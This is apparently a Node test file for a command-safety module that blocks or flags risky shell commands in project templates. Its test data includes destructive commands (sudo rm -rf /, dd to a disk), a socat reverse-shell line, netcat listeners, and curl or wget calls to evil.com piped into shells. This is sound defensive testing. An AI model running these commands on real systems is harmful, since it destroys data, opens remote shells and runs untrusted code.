import { test, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert';
import fs from 'fs';
import path from 'path';
import os from 'os';

// Force a temporary home directory for testing
const testHome = path.join(process.cwd(), '.test-home-safety');
process.env.HOME = testHome;

import { 
  isBlockedCommand, 
  isDangerousCommand, 
  validateTemplateSecurity, 
  getSecurityPolicy,
  resetExecutionCounts,
  canExecute,
  logSecurityEvent,
  isTrustedSource 
} from '../src/safety.js';

// Helper to clean up test files
function cleanup(...paths: string[]) {
  for (const p of paths) {
    if (fs.existsSync(p)) {
      fs.rmSync(p, { recursive: true, force: true });
    }
  }
}

// Setup test directory
function setupTestDir() {
  if (!fs.existsSync(testHome)) {
    fs.mkdirSync(testHome, { recursive: true });
  }
  const configDir = path.join(testHome, '.pt');
  if (!fs.existsSync(configDir)) {
    fs.mkdirSync(configDir, { recursive: true });
  }
}

test('isBlockedCommand: blocks sudo', () => {
  assert.strictEqual(isBlockedCommand('sudo rm -rf /'), true);
  assert.strictEqual(isBlockedCommand('sudo'), true);
  assert.strictEqual(isBlockedCommand('su'), true);
  assert.strictEqual(isBlockedCommand('su -'), true);
  assert.strictEqual(isBlockedCommand('su root'), true);
});

test('isBlockedCommand: blocks disk operations', () => {
  assert.strictEqual(isBlockedCommand('dd if=/dev/zero of=/dev/sda'), true);
  assert.strictEqual(isBlockedCommand('mkfs.ext4 /dev/sdb'), true);
  assert.strictEqual(isBlockedCommand('fdisk /dev/sda'), true);
  assert.strictEqual(isBlockedCommand('mount /dev/sda1 /mnt'), true);
  assert.strictEqual(isBlockedCommand('umount /mnt'), true);
});

test('isBlockedCommand: blocks dangerous chmod', () => {
  assert.strictEqual(isBlockedCommand('chmod 777 /'), true);
  assert.strictEqual(isBlockedCommand('chmod -R 777 /'), true);
  assert.strictEqual(isBlockedCommand('chmod 666 /etc/passwd'), true);
});

test('isBlockedCommand: blocks process killing', () => {
  assert.strictEqual(isBlockedCommand('kill -9 1234'), true);
  assert.strictEqual(isBlockedCommand('killall node'), true);
  assert.strictEqual(isBlockedCommand('pkill -f chrome'), true);
  assert.strictEqual(isBlockedCommand('fuser -k 8080'), true);
});

test('isBlockedCommand: blocks network exfiltration tools', () => {
  assert.strictEqual(isBlockedCommand('nc -l 1234'), true);
  assert.strictEqual(isBlockedCommand('netcat 10.0.0.1 4444'), true);
  assert.strictEqual(isBlockedCommand('socat TCP:1.2.3.4:8080 EXEC:bash'), true);
});

test('isBlockedCommand: blocks dangerous package manager commands', () => {
  assert.strictEqual(isBlockedCommand('apt purge nginx'), true);
  assert.strictEqual(isBlockedCommand('apt remove curl'), true);
  assert.strictEqual(isBlockedCommand('yum remove vim'), true);
  assert.strictEqual(isBlockedCommand('brew uninstall git'), true);
});

test('isBlockedCommand: prevents bypass attempts with whitespace', () => {
  // These should still be detected even with extra spaces or variants
  assert.strictEqual(isBlockedCommand('sudo rm -rf /'), true);
  assert.strictEqual(isBlockedCommand(' sudo rm -rf /'), true);
  assert.strictEqual(isBlockedCommand('sudo  rm -rf /'), true);
});

test('isBlockedCommand: prevents bypass with command chaining', () => {
  // The new parser splits by metacharacters and checks each command
  assert.strictEqual(isBlockedCommand('echo hello; sudo rm -rf /'), true);
  assert.strictEqual(isBlockedCommand('echo hello && sudo rm -rf /'), true);
  assert.strictEqual(isBlockedCommand('echo hello | sudo rm -rf /'), true);
  assert.strictEqual(isBlockedCommand('echo hello || sudo rm -rf /'), true);
  assert.strictEqual(isBlockedCommand('sudo rm -rf /; echo done'), true);
  assert.strictEqual(isBlockedCommand('ls && sudo rm -rf /'), true);
});

test('isBlockedCommand: prevents bypass with quotes', () => {
  assert.strictEqual(isBlockedCommand('"sudo" rm -rf /'), true);
  assert.strictEqual(isBlockedCommand("'sudo' rm -rf /"), true);
});

test('isBlockedCommand: allows safe commands', () => {
  assert.strictEqual(isBlockedCommand('ls -la'), false);
  assert.strictEqual(isBlockedCommand('npm install'), false);
  assert.strictEqual(isBlockedCommand('git status'), false);
  assert.strictEqual(isBlockedCommand('mkdir -p src'), false);
  assert.strictEqual(isBlockedCommand('echo hello'), false);
  assert.strictEqual(isBlockedCommand('cat file.txt'), false);
});

test('isDangerousCommand: warns on remote downloads', () => {
  assert.strictEqual(isDangerousCommand('curl https://example.com'), true);
  assert.strictEqual(isDangerousCommand('wget https://example.com/file'), true);
  assert.strictEqual(isDangerousCommand('curl -O https://example.com/file'), true);
  assert.strictEqual(isDangerousCommand('curl | bash'), true);
  assert.strictEqual(isDangerousCommand('wget | sh'), true);
});

test('isDangerousCommand: warns on script execution', () => {
  assert.strictEqual(isDangerousCommand('bash script.sh'), true);
  assert.strictEqual(isDangerousCommand('sh install.sh'), true);
  assert.strictEqual(isDangerousCommand('python3 script.py'), true);
  assert.strictEqual(isDangerousCommand('node -e "console.log(1)"'), true);
  assert.strictEqual(isDangerousCommand('node -p "1+1"'), true);
});

test('isDangerousCommand: warns on shell operations', () => {
  assert.strictEqual(isDangerousCommand('eval "echo hello"'), true);
  assert.strictEqual(isDangerousCommand('exec bash'), true);
  assert.strictEqual(isDangerousCommand('source ~/.bashrc'), true);
});

test('isDangerousCommand: warns on recursive file operations', () => {
  assert.strictEqual(isDangerousCommand('chmod -R 755 .'), true);
  assert.strictEqual(isDangerousCommand('chown -R user:group .'), true);
  assert.strictEqual(isDangerousCommand('chgrp -R group .'), true);
});

test('isDangerousCommand: warns on PowerShell dangerous commands', () => {
  assert.strictEqual(isDangerousCommand('powershell -c "Get-Process"'), true);
  assert.strictEqual(isDangerousCommand('pwsh -c "Get-Process"'), true);
  assert.strictEqual(isDangerousCommand('Invoke-Expression "Get-Process"'), true);
  assert.strictEqual(isDangerousCommand('IEX "Get-Process"'), true);
});

test('isDangerousCommand: warns on macOS dangerous commands', () => {
  assert.strictEqual(isDangerousCommand('diskutil eraseDisk'), true);
  assert.strictEqual(isDangerousCommand('hdiutil create'), true);
  assert.strictEqual(isDangerousCommand('csrutil disable'), true);
});

test('isDangerousCommand: warns on rm with absolute paths', () => {
  assert.strictEqual(isDangerousCommand('rm -rf /tmp'), true);
  assert.strictEqual(isDangerousCommand('rm -rf /etc/passwd'), true);
  assert.strictEqual(isDangerousCommand('rm /var/log/syslog'), true);
  assert.strictEqual(isDangerousCommand('rmdir /tmp/test'), true);
});

test('isDangerousCommand: prevents bypass with command chaining', () => {
  assert.strictEqual(isDangerousCommand('echo hello; curl https://evil.com'), true);
  assert.strictEqual(isDangerousCommand('ls && wget https://evil.com/malware'), true);
  assert.strictEqual(isDangerousCommand('echo test | curl https://evil.com'), true);
});

test('isDangerousCommand: allows safe relative path operations', () => {
  assert.strictEqual(isDangerousCommand('rm -rf build'), false);
  assert.strictEqual(isDangerousCommand('rm -rf ./dist'), false);
  assert.strictEqual(isDangerousCommand('rm file.txt'), false);
  assert.strictEqual(isDangerousCommand('rmdir empty_dir'), false);
});

test('validateTemplateSecurity: rejects templates with blocked commands', () => {
  const template = {
    post_config: [
      { command: 'sudo rm -rf /' }
    ]
  };
  
  const result = validateTemplateSecurity(template);
  assert.strictEqual(result.valid, false);
  assert.ok(result.errors.length > 0);
  assert.ok(result.errors[0].includes('Blocked command'));
});

test('validateTemplateSecurity: warns on dangerous commands', () => {
  const template = {
    post_config: [
      { command: 'curl https://example.com/install.sh | bash' }
    ]
  };
  
  const result = validateTemplateSecurity(template);
  assert.strictEqual(result.valid, true); // Warnings don't invalidate
  assert.ok(result.warnings.length > 0);
  assert.ok(result.warnings[0].includes('Dangerous command') || result.warnings[0].includes('Remote download'));
});

test('validateTemplateSecurity: warns on shell injection patterns', () => {
  const template = {
    post_config: [
      { command: 'echo hello; rm -rf /' },
      { command: 'echo hello && rm -rf /' },
      { command: 'echo hello | rm -rf /' }
    ]
  };
  
  const result = validateTemplateSecurity(template);
  assert.strictEqual(result.valid, true);
  assert.ok(result.warnings.some(w => w.includes('Shell injection pattern')));
});

test('validateTemplateSecurity: allows safe templates', () => {
  const template = {
    post_config: [
      { command: 'npm install' },
      { command: 'mkdir -p dist' },
      { command: 'cp src/* dist/' }
    ]
  };
  
  const result = validateTemplateSecurity(template);
  assert.strictEqual(result.valid, true);
  assert.strictEqual(result.errors.length, 0);
});

test('validateTemplateSecurity: handles missing post_config gracefully', () => {
  const template = {};
  const result = validateTemplateSecurity(template);
  assert.strictEqual(result.valid, true);
  assert.strictEqual(result.errors.length, 0);
  assert.strictEqual(result.warnings.length, 0);
});

test('validateTemplateSecurity: handles empty post_config', () => {
  const template = { post_config: [] };
  const result = validateTemplateSecurity(template);
  assert.strictEqual(result.valid, true);
});

test('getSecurityPolicy: returns defaults when no config', () => {
  const policy = getSecurityPolicy();
  assert.strictEqual(policy.maxExecutionTime, 30000);
  assert.strictEqual(policy.enableAuditLogging, true);
  assert.strictEqual(policy.maxCommandsPerRun, 50);
  assert.strictEqual(policy.securityLevel, 'warn');
  assert.ok(Array.isArray(policy.trustedSources));
});

test('canExecute: rate limits identical commands', () => {
  resetExecutionCounts();
  const cmd = 'npm install';
  assert.strictEqual(canExecute(cmd), true);
  assert.strictEqual(canExecute(cmd), false); // Rate limited
});

test('canExecute: respects max commands per run', () => {
  resetExecutionCounts();
  for (let i = 0; i < 50; i++) {
    assert.strictEqual(canExecute(`cmd${i}`), true);
  }
  assert.strictEqual(canExecute('cmd51'), false);
});

test('isTrustedSource: matches GitHub URLs', () => {
  const sources = ['github.com/garyritchie', 'github.com/lyonritchie'];
  assert.strictEqual(isTrustedSource('https://github.com/garyritchie/template', sources), true);
  assert.strictEqual(isTrustedSource('https://github.com/lyonritchie/repo', sources), true);
  assert.strictEqual(isTrustedSource('https://github.com/otheruser/repo', sources), false);
});

test('logSecurityEvent: creates audit log', () => {
  cleanup(path.join(testHome, '.pt', 'security-audit.log'));
  logSecurityEvent('command_executed', 'npm install', 'test-template', 'success');
  const logPath = path.join(testHome, '.pt', 'security-audit.log');
  assert.ok(fs.existsSync(logPath));
  const content = fs.readFileSync(logPath, 'utf-8');
  assert.ok(content.includes('command_executed'));
  assert.ok(content.includes('npm install'));
  assert.ok(content.includes('test-template'));
  assert.ok(content.includes('success'));
  cleanup(logPath);
});

test('resetExecutionCounts: clears rate limiting', () => {
  resetExecutionCounts();
  canExecute('test');
  canExecute('test');
  resetExecutionCounts();
  assert.strictEqual(canExecute('test'), true);
});

cleanup(testHome);